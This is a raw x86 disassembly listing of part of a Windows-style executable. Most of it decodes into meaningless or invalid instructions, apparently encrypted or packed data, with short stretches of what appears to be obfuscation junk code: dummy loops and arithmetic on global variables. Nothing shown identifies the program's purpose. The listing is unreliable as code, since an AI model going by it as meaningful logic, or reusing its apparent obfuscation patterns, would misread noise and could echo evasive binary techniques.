  40aa1d:	rcl    BYTE PTR [esi-0x7fba602e],cl
  40aa23:	ins    BYTE PTR es:[edi],dx
  40aa24:	addr16 int 0x74
  40aa27:	xor    ch,BYTE PTR [ecx]
  40aa29:	push   es
  40aa2a:	add    DWORD PTR [ebx+0x22],ebx
  40aa2d:	xor    ah,0x26
  40aa30:	mov    esi,0x7027ee63
  40aa35:	repz jge 0x40a9dc
  40aa38:	loopne 0x40aa84
  40aa3a:	add    BYTE PTR [ecx-0x5f],bl
  40aa3d:	(bad)  
  40aa3e:	pop    ebp
  40aa3f:	cld    
  40aa40:	mov    ds:0x688ab9d0,eax
  40aa45:	enter  0xffea,0x72
  40aa49:	mov    al,ds:0x58243a10
  40aa4e:	ret    0xac2
  40aa51:	in     eax,dx
  40aa52:	or     BYTE PTR [eax-0x12a8d388],dh
  40aa58:	add    dl,BYTE PTR [eax-0x66f970d]
  40aa5e:	inc    ebx
  40aa5f:	mov    dl,0x2b
  40aa61:	scas   eax,DWORD PTR es:[edi]
  40aa62:	out    dx,eax
  40aa63:	retf   0xad60
  40aa66:	pop    edx
  40aa67:	jns    0x40aa92
  40aa69:	xor    DWORD PTR [eax-0x685ffa0b],0x7f
  40aa70:	jnp    0x40aadc
  40aa72:	xor    edx,eax
  40aa74:	adc    DWORD PTR ds:0x434653,0x43467f
  40aa7e:	add    edx,ecx
  40aa80:	jmp    0x40c4f6
  40aa85:	mov    edx,DWORD PTR [ebp-0x2c]
  40aa88:	sub    DWORD PTR ds:0x4345f3,0x7416
  40aa92:	mov    edi,DWORD PTR [ebp-0x4]
  40aa95:	mov    ebx,DWORD PTR ds:0x4346fb
  40aa9b:	sub    ebx,DWORD PTR ds:0x43470b
  40aaa1:	mov    DWORD PTR ds:0x4346fb,ebx
  40aaa7:	xor    edx,eax
  40aaa9:	xor    edi,eax
  40aaab:	or     ebx,0x1288
  40aab1:	add    edi,ecx
  40aab3:	adc    ebx,DWORD PTR ds:0x4346bb
  40aab9:	jmp    0x40aed0
  40aabe:	test   DWORD PTR [eax-0x4c324c3f],edi
  40aac4:	jne    0x40ab36
  40aac6:	xchg   ebx,eax
  40aac7:	in     eax,0x4e
  40aac9:	in     eax,dx
  40aaca:	jecxz  0x40aa65
  40aacc:	lahf   
  40aacd:	lahf   
  40aace:	cld    
  40aacf:	(bad)  
  40aad0:	jle    0x40ab50
  40aad2:	jo     0x40ab4d
  40aad4:	jle    0x40ab54
  40aad6:	sbb    BYTE PTR [edi+0x5b],dh
  40aad9:	xchg   edi,eax
  40aada:	xor    BYTE PTR cs:0x29f12e62,al
  40aae1:	dec    ecx
  40aae2:	pop    edx
  40aae3:	stos   BYTE PTR es:[edi],al
  40aae4:	jmp    0xc8d1:0xde1c9b12
  40aaeb:	(bad)  
  40aaec:	or     ebx,esp
  40aaee:	jbe    0x40aafb
  40aaf0:	cmp    eax,0x535f7e88
  40aaf5:	int3   
  40aaf6:	cwde   
  40aaf7:	push   ebp
  40aaf8:	xchg   DWORD PTR [edi],ecx
  40aafa:	mov    DWORD PTR [ebx+0x5006b62c],edx
  40ab00:	call   0x1953:0xfe17feb0
  40ab07:	inc    esp
  40ab08:	leave  
  40ab09:	ficom  DWORD PTR [esi]
  40ab0b:	int3   
  40ab0c:	shl    DWORD PTR [ecx],0x35
  40ab0f:	dec    ebp
  40ab10:	add    al,0xaf
  40ab12:	inc    DWORD PTR [ecx]
  40ab14:	call   FWORD PTR [ecx-0x6a]
  40ab17:	test   BYTE PTR [ebx-0x3ab261d1],bh
  40ab1d:	retf   
  40ab1e:	fcmove st,st(0)
  40ab20:	into   
  40ab21:	push   edi
  40ab22:	aam    0x57
  40ab24:	or     eax,0xa40f1526
  40ab29:	xor    eax,DWORD PTR [ebx]
  40ab2b:	sub    al,0x89
  40ab2d:	and    eax,0x78f00059
  40ab32:	hlt    
  40ab33:	in     al,0xca
  40ab35:	mov    WORD PTR [ecx],gs
  40ab37:	fnstsw WORD PTR [ecx]
  40ab39:	ins    DWORD PTR es:[edi],dx
  40ab3a:	rcl    BYTE PTR [eax+edi*8],cl
  40ab3d:	mov    al,ch
  40ab3f:	jg     0x40ab83
  40ab41:	push   eax
  40ab42:	mov    dh,0x95
  40ab44:	dec    ebp
  40ab45:	mov    eax,ds:0x146bcd43
  40ab4a:	out    dx,eax
  40ab4b:	aaa    
  40ab4c:	pushf  
  40ab4d:	sub    BYTE PTR [edx+0x55],0x4d
  40ab51:	mov    ah,0xa8
  40ab53:	pop    esp
  40ab54:	(bad)  
  40ab55:	repnz pop esi
  40ab57:	dec    ecx
  40ab58:	iret   
  40ab59:	enter  0xb0fc,0x53
  40ab5d:	jmp    0x5457:0x3ffbfc25
  40ab64:	out    0x26,al
  40ab66:	(bad)  
  40ab67:	lods   al,BYTE PTR ds:[esi]
  40ab68:	pop    ds
  40ab69:	jp     0x40ab6f
  40ab6b:	lods   eax,DWORD PTR ds:[esi]
  40ab6c:	mov    esp,0xdeb6e0b6
  40ab71:	pop    ss
  40ab72:	daa    
  40ab73:	add    eax,0x1d2df061
  40ab78:	dec    ebx
  40ab79:	test   bh,dh
  40ab7b:	mov    eax,0x34662214
  40ab80:	test   DWORD PTR [ebx+0x385c2043],edi
  40ab86:	dec    ecx
  40ab87:	les    ecx,FWORD PTR [edi]
  40ab89:	add    esi,DWORD PTR [ebx+0x7fab1580]
  40ab8f:	add    DWORD PTR [edi],edx
  40ab91:	cmp    BYTE PTR [ebp-0x7d6d7eaa],0xa5
  40ab98:	mov    ds:0xb052d652,eax
  40ab9d:	jg     0x40ab59
  40ab9f:	mov    cl,0xd8
  40aba1:	jg     0x40ab9e
  40aba3:	popa   
  40aba4:	or     al,0x6a
  40aba6:	arpl   WORD PTR [edi+0x14c83eba],si
  40abac:	mov    ecx,0x2af298a5
  40abb1:	popf   
  40abb2:	out    dx,eax
  40abb3:	mov    bl,0xe5
  40abb5:	lea    ebp,[edx+ebp*1-0x76]
  40abb9:	xchg   edi,eax
  40abba:	adc    BYTE PTR [ecx-0x50],dh
  40abbd:	add    BYTE PTR [ecx+0x4bd8023e],bl
  40abc3:	imul   edi,esi,0x4f
  40abc6:	inc    eax
  40abc7:	xor    al,0x23
  40abc9:	fiadd  DWORD PTR [eax+0x3c2de73c]
  40abcf:	out    dx,al
  40abd0:	xchg   DWORD PTR [ecx+eiz*4-0x1d],ecx
  40abd4:	lahf   
  40abd5:	xor    eax,0xa1f8dac9
  40abda:	popf   
  40abdb:	aad    0x63
  40abdd:	dec    ecx
  40abde:	dec    ecx
  40abdf:	int    0x9
  40abe1:	imul   ecx,DWORD PTR [eax-0x6b797fb1],0xc505a384
  40abeb:	xlat   BYTE PTR ds:[ebx]
  40abec:	inc    edi
  40abed:	dec    esp
  40abee:	adc    dl,BYTE PTR [ebx+0x60e6ef56]
  40abf4:	das    
  40abf5:	jmp    FWORD PTR [edx+edi*4]
  40abf8:	fcom   DWORD PTR [ebx]
  40abfa:	out    0x0,al
  40abfc:	lods   eax,DWORD PTR ds:[esi]
  40abfd:	hlt    
  40abfe:	mov    BYTE PTR [ebp+0x40],bh
  40ac01:	int    0xa4
  40ac03:	push   es
  40ac04:	je     0x40ac48
  40ac06:	dec    ecx
  40ac07:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ac08:	and    BYTE PTR [eax],bh
  40ac0a:	inc    esp
  40ac0b:	lahf   
  40ac0c:	ins    BYTE PTR es:[edi],dx
  40ac0d:	xchg   edx,eax
  40ac0e:	cld    
  40ac0f:	retf   0x79ec
  40ac12:	imul   edx,DWORD PTR [edx+eiz*1],0x52d86b92
  40ac19:	pushf  
  40ac1a:	xchg   ebx,eax
  40ac1b:	and    DWORD PTR [esi+eiz*8-0x623f449d],esi
  40ac22:	addr16 iret 
  40ac24:	mov    ?,WORD PTR [esi]
  40ac26:	add    eax,0x5aeb7fda
  40ac2b:	sti    
  40ac2c:	xor    bl,BYTE PTR [eax]
  40ac2e:	jno    0x40ac6d
  40ac30:	aaa    
  40ac31:	(bad)  
  40ac32:	in     al,dx
  40ac33:	mov    al,ds:0xa3cf346f
  40ac38:	(bad)  [eax]
  40ac3a:	add    DWORD PTR [ebx],ebx
  40ac3c:	jb     0x40abea
  40ac3e:	pop    ds
  40ac3f:	cdq    
  40ac40:	push   cs
  40ac41:	lahf   
  40ac42:	(bad)  
  40ac43:	fisttp DWORD PTR [eax-0x1cc8eaca]
  40ac49:	(bad)  
  40ac4a:	(bad)  
  40ac4b:	es popa 
  40ac4d:	dec    esp
  40ac4e:	shr    BYTE PTR [eax],0xe3
  40ac51:	bound  ecx,QWORD PTR [eax+0x450c64ae]
  40ac57:	cmp    eax,0x944fb5d9
  40ac5c:	mov    BYTE PTR [esi+0x58],ah
  40ac5f:	xchg   ecx,eax
  40ac60:	inc    esi
  40ac61:	in     al,dx
  40ac62:	push   eax
  40ac63:	inc    eax
  40ac64:	xor    cl,BYTE PTR [edx+eiz*1-0x29]
  40ac68:	push   ss
  40ac69:	fld    QWORD PTR [edx-0x52]
  40ac6c:	fwait
  40ac6d:	stos   BYTE PTR es:[edi],al
  40ac6e:	rol    BYTE PTR [ebx+0x3a],0x10
  40ac72:	test   ch,dl
  40ac74:	or     BYTE PTR [esi-0x7056753b],dl
  40ac7a:	pusha  
  40ac7b:	jbe    0x40ac1d
  40ac7d:	pop    ebp
  40ac7e:	les    ebx,FWORD PTR [eax]
  40ac80:	pop    ss
  40ac81:	in     al,0xce
  40ac83:	aaa    
  40ac84:	clc    
  40ac85:	out    0xda,al
  40ac87:	test   eax,0x8c366641
  40ac8c:	sub    DWORD PTR ds:0xcb82447a,edx
  40ac92:	push   es
  40ac93:	and    al,0x9d
  40ac95:	fwait
  40ac96:	inc    ebx
  40ac97:	es retf 
  40ac99:	cwde   
  40ac9a:	cld    
  40ac9b:	(bad)  
  40ac9c:	imul   esp,DWORD PTR [edx+ecx*1+0x55],0xf2b30b9d
  40aca4:	sbb    edi,0xa3cce451
  40acaa:	sbb    eax,0x6b47acfd
  40acaf:	loopne 0x40ace2
  40acb1:	dec    eax
  40acb2:	cs pushf 
  40acb4:	cdq    
  40acb5:	xor    eax,0x6f227ef3
  40acba:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40acbb:	mov    bh,0xc9
  40acbd:	push   0x295976de
  40acc2:	pop    ebx
  40acc3:	add    DWORD PTR [edx-0x55],edi
  40acc6:	sbb    al,BYTE PTR [ebx]
  40acc8:	cmp    DWORD PTR [edx+ebp*2],edi
  40accb:	xchg   ebp,eax
  40accc:	retf   0x56e
  40accf:	gs cdq 
  40acd1:	fs jnp 0x40acec
  40acd4:	pop    edx
  40acd5:	cli    
  40acd6:	adc    bl,bl
  40acd8:	addr16 iret 
  40acda:	mov    esp,0xd0b176b8
  40acdf:	push   edx
  40ace0:	jmp    0x40acaa
  40ace2:	and    eax,0x75d3ca2c
  40ace7:	mov    edx,0xda3610be
  40acec:	jp     0x40aced
  40acee:	pop    ebx
  40acef:	call   0x4180948a
  40acf4:	ins    BYTE PTR es:[edi],dx
  40acf5:	gs mov esi,0x250eee66
  40acfb:	imul   ebx,DWORD PTR ss:[ecx],0x72
  40acff:	xlat   BYTE PTR ds:[ebx]
  40ad00:	adc    eax,0x239c6067
  40ad05:	jae    0x40ad12
  40ad07:	lea    esi,[ecx]
  40ad09:	fs cmc 
  40ad0b:	xor    eax,0xf68342f2
  40ad10:	and    ecx,0x3e26d3a5
  40ad16:	mov    esi,0x50588850
  40ad1b:	cmp    eax,0xc93b55cd
  40ad20:	aaa    
  40ad21:	cli    
  40ad22:	pop    ecx
  40ad23:	dec    edx
  40ad24:	push   edx
  40ad25:	or     DWORD PTR [ebx-0x38],ebp
  40ad28:	and    eax,0x6ae4d628
  40ad2d:	xor    BYTE PTR [eax-0x7fa146ba],bh
  40ad33:	jbe    0x40aced
  40ad35:	ret    0x9afb
  40ad38:	adc    DWORD PTR [eax+0x6d],esp
  40ad3b:	rol    BYTE PTR [ecx+0x4c8508e2],0xc4
  40ad42:	sbb    DWORD PTR [ecx-0x6ad59fac],0x29c6fe53
  40ad4c:	clc    
  40ad4d:	mov    ah,0x67
  40ad4f:	xchg   BYTE PTR [edx-0x59],ch
  40ad52:	push   ebx
  40ad53:	ret    0x97f9
  40ad56:	leave  
  40ad57:	xor    dh,BYTE PTR [eax-0x5d]
  40ad5a:	push   ecx
  40ad5b:	aad    0xb0
  40ad5d:	ror    DWORD PTR [ebp-0xf34a8cc],1
  40ad63:	pop    eax
  40ad64:	(bad)  
  40ad65:	mov    edi,0x28370480
  40ad6a:	ficom  WORD PTR [esi]
  40ad6c:	(bad)  
  40ad6d:	pushf  
  40ad6e:	ins    BYTE PTR es:[edi],dx
  40ad6f:	jmp    0x8d21a3c
  40ad74:	in     al,dx
  40ad75:	inc    ecx
  40ad76:	sbb    BYTE PTR [ebx*8+0x31d1e592],0xd7
  40ad7e:	out    dx,al
  40ad7f:	repnz push edi
  40ad81:	pop    es
  40ad82:	xor    dh,al
  40ad84:	cli    
  40ad85:	pop    edi
  40ad86:	aas    
  40ad87:	inc    eax
  40ad88:	cmp    al,0xe2
  40ad8a:	rcl    BYTE PTR [edx+eax*2],0xcb
  40ad8e:	sbb    BYTE PTR [edx],bh
  40ad90:	add    eax,0x74179bb5
  40ad95:	sbb    bl,BYTE PTR [ecx+eax*2]
  40ad98:	inc    esi
  40ad99:	popa   
  40ad9a:	push   edx
  40ad9b:	ret    0x568d
  40ad9e:	stos   BYTE PTR es:[edi],al
  40ad9f:	outs   dx,DWORD PTR ds:[esi]
  40ada0:	push   edx
  40ada1:	mov    dl,0x4
  40ada3:	shl    ch,1
  40ada5:	jb     0x40add9
  40ada7:	xchg   ebx,eax
  40ada8:	sbb    eax,0x73dbafbc
  40adad:	xchg   esp,eax
  40adae:	and    cl,BYTE PTR [ebx-0x381450ed]
  40adb4:	lds    eax,FWORD PTR [ecx-0x21d44fb0]
  40adba:	sub    ah,BYTE PTR [edx+0x22f45d91]
  40adc0:	sub    al,0x79
  40adc3:	int    0x32
  40adc5:	inc    ebx
  40adc6:	out    0xd6,al
  40adc8:	mov    edi,0x10d5a201
  40adcd:	jp     0x40ae26
  40adcf:	xor    al,0x48
  40add1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40add2:	mov    ah,0x5e
  40add4:	push   es
  40add5:	mov    bl,0x43
  40add7:	push   es
  40add8:	repnz lods al,BYTE PTR ds:[esi]
  40adda:	fistp  WORD PTR [esi-0x43678f0a]
  40ade0:	pop    esi
  40ade1:	and    BYTE PTR [eax-0x22],dh
  40ade4:	cdq    
  40ade5:	cmps   DWORD PTR fs:[esi],DWORD PTR es:[edi]
  40ade7:	xor    eax,0x2c0c2529
  40adec:	xor    eax,DWORD PTR [edi]
  40adee:	hlt    
  40adef:	pop    ss
  40adf0:	xchg   edi,eax
  40adf1:	nop
  40adf2:	mov    eax,0x445933cd
  40adf7:	xchg   ebx,eax
  40adf8:	xor    bh,BYTE PTR [edi+ebx*1-0x4b0a1ca7]
  40adff:	lea    eax,[ebx-0x5e]
  40ae02:	push   eax
  40ae03:	fstp   QWORD PTR [eax]
  40ae05:	not    DWORD PTR [eax]
  40ae07:	sbb    eax,DWORD PTR [ecx]
  40ae09:	cmp    BYTE PTR [edi],al
  40ae0b:	hlt    
  40ae0c:	pop    esp
  40ae0d:	popf   
  40ae0e:	pop    ebx
  40ae0f:	std    
  40ae10:	(bad)  
  40ae11:	in     eax,dx
  40ae12:	dec    edx
  40ae13:	xchg   ebp,eax
  40ae14:	into   
  40ae15:	push   cs
  40ae16:	imul   edi,ecx,0x3c
  40ae19:	sbb    eax,0xed95da1b
  40ae1e:	pop    esp
  40ae1f:	enter  0xfbb0,0x6d
  40ae23:	xchg   ecx,eax
  40ae24:	xchg   BYTE PTR ds:0xd094ec8a,cl
  40ae2a:	mov    eax,0x9c9f7c07
  40ae2f:	mov    eax,ds:0x1e8f22b
  40ae34:	loopne 0x40ae70
  40ae36:	push   eax
  40ae37:	mov    DWORD PTR [ebp-0x3e520154],esp
  40ae3d:	jae    0x40ae16
  40ae3f:	call   0xb741:0x124a6a0e
  40ae46:	mov    esi,0xc39d0a15
  40ae4b:	inc    ecx
  40ae4c:	sar    BYTE PTR [esi+0x98626a2],cl
  40ae52:	(bad)  
  40ae54:	push   ecx
  40ae55:	loope  0x40aeb1
  40ae57:	ja     0x40ae1e
  40ae59:	(bad)  
  40ae5a:	xchg   ecx,eax
  40ae5b:	call   0x6e1b:0x4c79c9ab
  40ae62:	push   ds
  40ae63:	inc    eax
  40ae64:	pop    ebx
  40ae65:	xor    DWORD PTR [ecx-0x37546956],0x9be1a4c4
  40ae6f:	clc    
  40ae70:	ror    BYTE PTR ds:0x7f059810,cl
  40ae76:	mov    esi,0x5849c4a0
  40ae7b:	inc    ebp
  40ae7c:	cmc    
  40ae7d:	sub    eax,DWORD PTR [ecx-0x40]
  40ae80:	sbb    eax,0xcb671fc4
  40ae85:	popf   
  40ae86:	jne    0x40aea1
  40ae88:	and    al,0x27
  40ae8a:	hlt    
  40ae8b:	mov    al,bl
  40ae8d:	pop    es
  40ae8e:	cmp    esp,DWORD PTR [esi+0x427775ac]
  40ae94:	adc    DWORD PTR [eax+edi*4-0x71],0x8aa86cb6
  40ae9c:	test   eax,0x53ecdc5a
  40aea1:	adc    eax,0x725f9f29
  40aea6:	aam    0xf6
  40aea8:	and    ch,bl
  40aeaa:	mov    ch,0x2e
  40aeac:	adc    ecx,ebp
  40aeae:	stc    
  40aeaf:	or     ah,bl
  40aeb1:	adc    ch,BYTE PTR [esi+0x6d]
  40aeb4:	pop    edx
  40aeb5:	pop    ecx
  40aeb6:	in     eax,0xd
  40aeb8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40aeb9:	sub    al,0x50
  40aebb:	aad    0x1d
  40aebd:	daa    
  40aebe:	mov    cl,0x6
  40aec0:	adc    DWORD PTR ds:0xed579b26,esp
  40aec6:	xchg   ecx,eax
  40aec7:	xor    ebx,ebp
  40aec9:	sbb    ecx,DWORD PTR [eax-0x35]
  40aecc:	and    al,0x13
  40aece:	pushf  
  40aecf:	sub    BYTE PTR [ebx],al
  40aed1:	ror    DWORD PTR [edi],1
  40aed3:	scas   eax,DWORD PTR es:[edi]
  40aed4:	xlat   BYTE PTR ds:[ebx]
  40aed5:	xor    ebx,DWORD PTR ds:0x434653
  40aedb:	mov    edi,DWORD PTR [ebp-0x8]
  40aede:	mov    ebx,DWORD PTR [ebp-0x10]
  40aee1:	xor    DWORD PTR ds:0x434647,0x7c2a
  40aeeb:	sub    ebx,edi
  40aeed:	mov    DWORD PTR ds:0x43463f,0x592f
  40aef7:	cmp    ebx,edx
  40aef9:	mov    DWORD PTR ds:0x4346ff,0x4e0a
  40af03:	ja     0x40af21
  40af09:	mov    DWORD PTR ds:0x43468f,ebx
  40af0f:	mov    edx,DWORD PTR [ebp-0x28]
  40af12:	mov    DWORD PTR ds:0x4345ef,0x4d1d
  40af1c:	jmp    0x40bcba
  40af21:	sub    DWORD PTR ds:0x43463b,ebx
  40af27:	mov    edx,DWORD PTR [ebp-0x30]
  40af2a:	add    edi,edi
  40af2c:	mov    edi,DWORD PTR [ebp-0x4]
  40af2f:	and    DWORD PTR ds:0x434647,0x0
  40af39:	jmp    0x40af4d
  40af3e:	xor    ebx,ebx
  40af40:	or     ebx,DWORD PTR ds:0x434647
  40af46:	inc    ebx
  40af47:	mov    DWORD PTR ds:0x434647,ebx
  40af4d:	cmp    DWORD PTR ds:0x434647,0x1a
  40af54:	jae    0x40af87
  40af5a:	cmp    DWORD PTR ds:0x434647,0x22
  40af61:	jne    0x40af82
  40af67:	push   0x434677
  40af6c:	push   DWORD PTR [ebp-0x28]
  40af6f:	push   0x43468b
  40af74:	push   0x42d8
  40af79:	push   DWORD PTR [ebp-0x24]
  40af7c:	call   DWORD PTR ds:0x4130c4
  40af82:	jmp    0x40af3e
  40af87:	xor    edx,eax
  40af89:	xor    ebx,0x22d8
  40af8f:	xor    edi,eax
  40af91:	add    edi,ecx
  40af93:	and    DWORD PTR ds:0x434713,0x0
  40af9d:	mov    ebx,DWORD PTR ds:0x434713
  40afa3:	inc    ebx
  40afa4:	mov    DWORD PTR ds:0x434713,ebx
  40afaa:	cmp    DWORD PTR ds:0x434713,0x23
  40afb1:	jne    0x40afd2
  40afb7:	push   DWORD PTR [ebp-0x10]
  40afba:	push   DWORD PTR [ebp-0x18]
  40afbd:	push   0x635c
  40afc2:	push   0x3675
  40afc7:	push   0x36d2
  40afcc:	call   DWORD PTR ds:0x413290
  40afd2:	cmp    DWORD PTR ds:0x434713,0x14
  40afd9:	jb     0x40af9d
  40afdf:	add    edx,ecx
  40afe1:	imul   edx,edi
  40afe4:	mov    edi,DWORD PTR [ebp-0x8]
  40afe7:	mov    ebx,DWORD PTR [ebp-0x10]
  40afea:	jmp    0x40b401
  40afef:	aas    
  40aff0:	and    DWORD PTR [eax],0xefb16010
  40aff6:	push   ecx
  40aff7:	repnz test al,0x23
  40affa:	pusha  
  40affb:	mov    dh,0xc9
  40affd:	add    eax,0x7efaf631
  40b002:	jle    0x40b074
  40b004:	jns    0x40b084
  40b006:	jle    0x40b049
  40b008:	pop    edi
  40b009:	push   esp
  40b00a:	add    ebx,ebp
  40b00c:	push   es
  40b00d:	in     eax,0x73
  40b00f:	add    al,0x2e
  40b011:	fstp   QWORD PTR [eax-0x69]
  40b014:	ss aam 0x2a
  40b017:	xor    ebp,DWORD PTR [ebp+0x60]
  40b01a:	dec    ecx
  40b01b:	jmp    0x40b022
  40b01d:	cmp    edx,0xffffffee
  40b020:	pop    ebx
  40b021:	mov    ch,0x85
  40b023:	mov    bh,0xbf
  40b025:	in     al,0x63
  40b027:	pop    ebx
  40b028:	xor    esi,DWORD PTR [ebp+0x24f12dff]
  40b02e:	mov    ebp,0xaa52c775
  40b033:	icebp  
  40b034:	ins    DWORD PTR es:[edi],dx
  40b035:	inc    esi
  40b036:	aaa    
  40b037:	push   ebp
  40b038:	call   0xeb875a71
  40b03d:	xlat   BYTE PTR ds:[ebx]
  40b03e:	je     0x40b087
  40b040:	dec    esp
  40b041:	ins    BYTE PTR es:[edi],dx
  40b042:	(bad)  
  40b044:	test   eax,0x7a67235f
  40b049:	stos   DWORD PTR es:[edi],eax
  40b04a:	adc    BYTE PTR ds:0xdb5830b,bh
  40b050:	mov    esi,0x7e39a72f
  40b055:	pushf  
  40b056:	shl    esp,0xd4
  40b059:	add    eax,esp
  40b05b:	ins    DWORD PTR es:[edi],dx
  40b05c:	jo     0x40b03f
  40b05e:	fadd   st(3),st
  40b060:	pop    ss
  40b061:	retf   0xbf10
  40b064:	jno    0x40b038
  40b066:	fs cwde 
  40b068:	jb     0x40b0b7
  40b06a:	push   0x76da3875
  40b06f:	mov    eax,ds:0x43208b68
  40b074:	out    dx,eax
  40b075:	std    
  40b076:	fucomip st,st(2)
  40b078:	retf   
  40b079:	fwait
  40b07a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b07b:	mov    es,WORD PTR [eax]
  40b07d:	push   edx
  40b07e:	aaa    
  40b07f:	fmul   QWORD PTR [edx+0x3eec1ffd]
  40b085:	retf   
  40b086:	cmp    ecx,ebx
  40b088:	in     ax,dx
  40b08a:	dec    edi
  40b08b:	xchg   DWORD PTR [eax+ebx*2+0x38a799ac],edi
  40b092:	test   esp,0x371e6981
  40b098:	cmp    eax,0x18a6a77a
  40b09d:	arpl   cx,bx
  40b09f:	jecxz  0x40b080
  40b0a1:	(bad)  
  40b0a2:	nop
  40b0a3:	scas   al,BYTE PTR es:[edi]
  40b0a4:	bound  esi,QWORD PTR [esi+0x52693bbd]
  40b0aa:	pop    edx
  40b0ab:	es icebp 
  40b0ad:	enter  0x2520,0x5f
  40b0b1:	jmp    0x8c4f573
  40b0b6:	pop    esi
  40b0b7:	mov    esi,0xd4292ecf
  40b0bc:	sub    dh,ah
  40b0be:	xor    al,0x8d
  40b0c0:	and    eax,DWORD PTR [ebx-0x7f]
  40b0c3:	add    BYTE PTR [ebx],cl
  40b0c5:	hlt    
  40b0c6:	nop
  40b0c7:	mov    edx,0x5aed4ed2
  40b0cc:	add    DWORD PTR [ebx],0xa88f71ce
  40b0d2:	repnz adc al,0xa7
  40b0d5:	xchg   edi,eax
  40b0d6:	cld    
  40b0d7:	test   BYTE PTR [ebx-0x43a8909],al
  40b0dd:	or     al,0x52
  40b0df:	daa    
  40b0e0:	xor    dh,BYTE PTR [edi+0x5fcdf18e]
  40b0e6:	in     al,dx
  40b0e7:	xchg   esp,eax
  40b0e8:	sub    ah,BYTE PTR [eax]
  40b0ea:	jg     0x40b144
  40b0ec:	setne  bh
  40b0ef:	retf   
  40b0f0:	mov    cl,0xdd
  40b0f2:	scas   al,BYTE PTR es:[edi]
  40b0f3:	jae    0x40b096
  40b0f5:	cmc    
  40b0f6:	jb     0x40b105
  40b0f8:	sub    al,0x37
  40b0fa:	(bad)  
  40b0fb:	adc    al,0x12
  40b0fd:	cmp    edx,DWORD PTR [ebp-0x6e352ccd]
  40b103:	fistp  QWORD PTR [edi+0x6e]
  40b106:	lock inc ecx
  40b108:	ss jns 0x40b0d4
  40b10b:	or     ebx,DWORD PTR [edi+0x7ecb5224]
  40b111:	xchg   edx,eax
  40b112:	shl    DWORD PTR [edi-0x64bec852],cl
  40b118:	adc    BYTE PTR [edx],dh
  40b11a:	xlat   BYTE PTR ds:[ebx]
  40b11b:	nop
  40b11c:	in     eax,0x37
  40b11e:	dec    edi
  40b11f:	(bad)  
  40b120:	aad    0x1f
  40b122:	call   0xfdad:0x7a2e93df
  40b129:	icebp  
  40b12a:	jo     0x40b0f0
  40b12c:	sub    ah,0x6f
  40b12f:	mov    ecx,0x6bcde6b2
  40b134:	inc    ebx
  40b135:	adc    esp,DWORD PTR [ecx-0x55]
  40b138:	mov    eax,DWORD PTR [ecx-0x15]
  40b13b:	lahf   
  40b13c:	icebp  
  40b13d:	push   ss
  40b13e:	test   BYTE PTR [ecx+0x1a2815c7],bh
  40b144:	cmp    esi,DWORD PTR [esi]
  40b146:	mov    dh,0xaf
  40b148:	xchg   ebp,eax
  40b149:	dec    eax
  40b14a:	and    eax,0x9d00aaf7
  40b14f:	cmp    BYTE PTR [ebx],0xf6
  40b152:	mov    al,0x38
  40b154:	adc    esi,edx
  40b156:	mov    dl,bh
  40b158:	js     0x40b102
  40b15a:	mov    edi,0xa7bb8b9d
  40b15f:	xchg   esp,eax
  40b160:	das    
  40b161:	cmp    al,0xad
  40b163:	iret   
  40b164:	(bad)  
  40b166:	jmp    0x9c5d248b
  40b16b:	inc    esi
  40b16c:	rcr    al,cl
  40b16e:	retf   0xea3a
  40b171:	clc    
  40b172:	jg     0x40b122
  40b174:	jmp    0x40b1bd
  40b176:	into   
  40b177:	push   ecx
  40b178:	repz gs mov edx,0x3398a33
  40b17f:	cld    
  40b180:	test   BYTE PTR [edx-0x60bd8a46],dl
  40b186:	and    DWORD PTR [edx+0x26],esi
  40b189:	or     BYTE PTR [edi-0x2f],0x74
  40b18d:	sbb    DWORD PTR [ecx-0x34],edx
  40b190:	or     DWORD PTR [ecx-0x1],ecx
  40b193:	enter  0xb89a,0x62
  40b197:	jbe    0x40b216
  40b199:	cmp    al,0xff
  40b19b:	sti    
  40b19c:	dec    ebx
  40b19d:	add    BYTE PTR [ebp+0x1adf68c0],dh
  40b1a3:	push   ds
  40b1a4:	pusha  
  40b1a5:	js     0x40b1f5
  40b1a7:	test   BYTE PTR [edx-0x50],dl
  40b1aa:	pop    edx
  40b1ab:	mov    bh,0x32
  40b1ad:	push   ebp
  40b1ae:	sub    eax,DWORD PTR [ebx-0x2e]
  40b1b1:	xchg   esi,eax
  40b1b2:	sbb    al,0x23
  40b1b4:	push   cs
  40b1b5:	xor    BYTE PTR [ebp+0x327fb264],0x5b
  40b1bc:	lahf   
  40b1bd:	aad    0x85
  40b1bf:	ret    
  40b1c0:	iret   
  40b1c1:	push   ss
  40b1c2:	mov    DWORD PTR [eax+0x50],edx
  40b1c5:	xor    eax,0x86b2a226
  40b1ca:	arpl   si,bx
  40b1cc:	xchg   edi,eax
  40b1cd:	ror    BYTE PTR [edx+0x690322dd],0x2a
  40b1d4:	or     ecx,edx
  40b1d6:	sbb    eax,0x8d3873bb
  40b1db:	call   0x531e9e44
  40b1e0:	(bad)  
  40b1e1:	out    0xb1,eax
  40b1e3:	es popa 
  40b1e5:	or     ecx,edx
  40b1e7:	je     0x40b24e
  40b1e9:	mov    bl,0xe0
  40b1eb:	dec    ecx
  40b1ec:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b1ed:	shl    DWORD PTR [esi],0x5e
  40b1f0:	pusha  
  40b1f1:	mov    eax,eax
  40b1f3:	in     eax,dx
  40b1f4:	or     ah,BYTE PTR [esi+0x19]
  40b1f7:	mov    ds:0xcde4e098,al
  40b1fc:	inc    ebp
  40b1fd:	rol    DWORD PTR [ebp-0x7a],0xeb
  40b201:	inc    ebx
  40b202:	mov    WORD PTR [edi+0x77],?
  40b205:	inc    esp
  40b206:	rcl    BYTE PTR [eax+0x640622f1],0x89
  40b20d:	cmp    DWORD PTR [ecx],esp
  40b20f:	cmp    al,0xb7
  40b211:	arpl   WORD PTR [esi-0x62cd80e0],ax
  40b217:	push   esp
  40b218:	mov    esi,0x582d2195
  40b21d:	mov    ebx,0x15581950
  40b222:	call   0x103:0xa1b15b8d
  40b229:	nop
  40b22a:	dec    edx
  40b22b:	fcmovnb st,st(4)
  40b22d:	pop    edi
  40b22e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b22f:	sbb    DWORD PTR [edx],0x9793e872
